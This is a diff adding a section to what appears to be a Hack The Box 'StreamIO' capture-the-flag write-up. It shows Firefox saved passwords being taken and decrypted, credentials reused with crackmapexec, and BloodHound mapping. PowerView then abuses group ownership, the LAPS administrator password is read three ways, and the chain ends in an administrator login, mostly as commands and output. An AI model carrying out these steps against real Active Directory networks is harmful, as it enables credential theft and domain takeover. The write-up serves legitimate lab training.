@@ -314,3 +314,203 @@ SMB         watch.streamIO.htb 5985   DC               [*] Windows 10.0 Build 17
 HTTP        watch.streamIO.htb 5985   DC               [*] http://watch.streamIO.htb:5985/wsman
 WINRM       watch.streamIO.htb 5985   DC               [+] streamIO.htb\nikk37:get_dem_girls2@yahoo.com (Pwn3d!)
 ```
+
+# Auth as JDgodd
+### Enum 
+WinPEAS notice that there is a FireFox database file which may contain some credentials. Researching how to
+decrypt FireFox database passwords from `key4.db`
+
+* https://github.com/A1vinSmith/firepwd
+* https://0xdf.gitlab.io/2022/03/05/htb-hancliffe.html#decrypt-passwords
+* https://raw.githubusercontent.com/lclevy/firepwd/master/mozilla_pbe.pdf
+
+```cmd
+*Evil-WinRM* PS C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\br53rxeg.default-release> download key4.db
+                                        
+Info: Downloading C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db to key4.db
+                                        
+Info: Download successful!
+*Evil-WinRM* PS C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\br53rxeg.default-release> download logins.json
+```
+
+```bash
+python3 ~/Tools/firepwd/firepwd.py -d Firefox
+globalSalt: b'd215c391179edb56af928a06c627906bcbd4bd47'
+ SEQUENCE {
+   SEQUENCE {
+     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
+     SEQUENCE {
+       SEQUENCE {
+         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
+         SEQUENCE {
+           OCTETSTRING b'5d573772912b3c198b1e3ee43ccb0f03b0b23e46d51c34a2a055e00ebcd240f5'
+           INTEGER b'01'
+           INTEGER b'20'
+           SEQUENCE {
+             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
+           }
+         }
+       }
+       SEQUENCE {
+         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
+         OCTETSTRING b'1baafcd931194d48f8ba5775a41f'
+       }
+     }
+   }
+   OCTETSTRING b'12e56d1c8458235a4136b280bd7ef9cf'
+ }
+clearText b'70617373776f72642d636865636b0202'
+password check? True
+ SEQUENCE {
+   SEQUENCE {
+     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
+     SEQUENCE {
+       SEQUENCE {
+         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
+         SEQUENCE {
+           OCTETSTRING b'098560d3a6f59f76cb8aad8b3bc7c43d84799b55297a47c53d58b74f41e5967e'
+           INTEGER b'01'
+           INTEGER b'20'
+           SEQUENCE {
+             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
+           }
+         }
+       }
+       SEQUENCE {
+         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
+         OCTETSTRING b'e28a1fe8bcea476e94d3a722dd96'
+       }
+     }
+   }
+   OCTETSTRING b'51ba44cdd139e4d2b25f8d94075ce3aa4a3d516c2e37be634d5e50f6d2f47266'
+ }
+clearText b'b3610ee6e057c4341fc76bc84cc8f7cd51abfe641a3eec9d0808080808080808'
+decrypting login/password pairs
+https://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3@t0r'
+https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
+https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
+https://slack.streamio.htb:b'JDgodd',b'password@12'
+
+crackmapexec winrm streamio.htb -u JDgodd -p 'password@12'
+
+crackmapexec smb streamio.htb -u JDgodd -p JDg0dd1s@d0p3cr3@t0r
+SMB         watch.streamIO.htb 445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
+SMB         watch.streamIO.htb 445    DC               [+] streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r
+```
+
+### Bloodhound
+```bash
+bloodhound-python -c all -d streamio.htb -dc streamio.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' --zip -ns $IP
+INFO: Found AD domain: streamio.htb
+INFO: Getting TGT for user
+WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+INFO: Connecting to LDAP server: streamio.htb
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: streamio.htb
+INFO: Found 8 users
+INFO: Found 54 groups
+INFO: Found 4 gpos
+INFO: Found 1 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: DC.streamIO.htb
+INFO: Done in 01M 13S
+INFO: Compressing output into 20231201164155_bloodhound.zip
+
+sudo neo4j console
+```
+
+JDgodd -> Node Info -> OUTBOUND OBJECT CONTROL -> First Degree Object Control
+
+Clicking that “1” shows that JDgodd has ownership and WriteOwner on the Core Staff group.
+
+Expanding out from Core Staff and setup the DC.STREAMIO.HTB as ending node while the JDgodd as statintg node, it has ReadLAPSPassword on the DC computer object:
+
+##### Add JDgodd to the CORE STAFF group
+```cmd
+*Evil-WinRM* PS C:\Users\nikk37\Documents> upload PowerView.ps1
+*Evil-WinRM* PS C:\Users\nikk37\Documents> Import-Module .\PowerView.ps1                 
+Info: Upload successful
+
+*Evil-WinRM* PS C:\Users\nikk37\Documents> $SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
+*Evil-WinRM* PS C:\Users\nikk37\Documents> $Cred = New-Object System.Management.Automation.PSCredential('STREAMIO.HTB\JDGODD', $SecPassword)
+*Evil-WinRM* PS C:\Users\nikk37\Documents> Add-DomainObjectAcl -Credential $Cred -TargetIdentity "CORE STAFF" -PrincipalIdentity "JDGODD"
+*Evil-WinRM* PS C:\Users\nikk37\Documents> Add-DomainGroupMember -Identity 'CORE STAFF' -Members 'JDGODD' -Credential $Cred
+*Evil-WinRM* PS C:\Users\nikk37\Documents> Get-DomainGroupMember -Identity 'CORE STAFF'
+
+GroupDomain             : streamIO.htb
+GroupName               : CORE STAFF
+GroupDistinguishedName  : CN=CORE STAFF,CN=Users,DC=streamIO,DC=htb
+MemberDomain            : streamIO.htb
+MemberName              : JDgodd
+MemberDistinguishedName : CN=JDgodd,CN=Users,DC=streamIO,DC=htb
+MemberObjectClass       : user
+MemberSID               : S-1-5-21-1470860369-1569627196-4264678630-1104
+
+*Evil-WinRM* PS C:\Users\nikk37\Documents> net user jdgodd
+User name                    JDgodd
+Full Name
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            2/22/2022 1:56:42 AM
+Password expires             Never
+Password changeable          2/23/2022 1:56:42 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   12/1/2023 7:09:33 AM
+
+Logon hours allowed          All
+
+Local Group Memberships
+Global Group memberships     *Domain Users         *CORE STAFF
+The command completed successfully.
+```
+
+##### Read LAPS Password with 3 different ways
+1. cme
+2. ldapsearch
+3. pyLAPS.py
+
+```bash
+crackmapexec smb streamio.htb -u JDgodd -p JDg0dd1s@d0p3cr3@t0r --laps --ntds
+SMB         watch.streamIO.htb 445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
+SMB         watch.streamIO.htb 445    DC               [-] DC\administrator:@[C21{#FZVH,n! STATUS_LOGON_FAILURE
+
+ldapsearch -x -H ldap://$IP -b 'DC=streamIO,DC=htb' -x -D JDgodd@streamio.htb -w 'JDg0dd1s@d0p3cr3@t0r' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd | grep ms-MCS-AdmPwd -n5
+1-# extended LDIF
+2-#
+3-# LDAPv3
+4-# base <DC=streamIO,DC=htb> with scope subtree
+5:# filter: (ms-MCS-AdmPwd=*)
+6:# requesting: ms-MCS-AdmPwd 
+7-#
+8-
+9-# DC, Domain Controllers, streamIO.htb
+10-dn: CN=DC,OU=Domain Controllers,DC=streamIO,DC=htb
+11-ms-Mcs-AdmPwd: @[C21{#FZVH,n!
+
+python pyLAPS.py --action get -u 'JDgodd' -d 'streamio.htb' -p 'JDg0dd1s@d0p3cr3@t0r' --dc-ip $IP
+                 __    ___    ____  _____
+    ____  __  __/ /   /   |  / __ \/ ___/
+   / __ \/ / / / /   / /| | / /_/ /\__ \   
+  / /_/ / /_/ / /___/ ___ |/ ____/___/ /   
+ / .___/\__, /_____/_/  |_/_/    /____/    v1.2
+/_/    /____/           @podalirius_           
+    
+[+] Extracting LAPS passwords of all computers ... 
+  | DC$                  : @[C21{#FZVH,n!
+
+evil-winrm -i $IP -u administrator -p '@[C21{#FZVH,n!'
+  ```
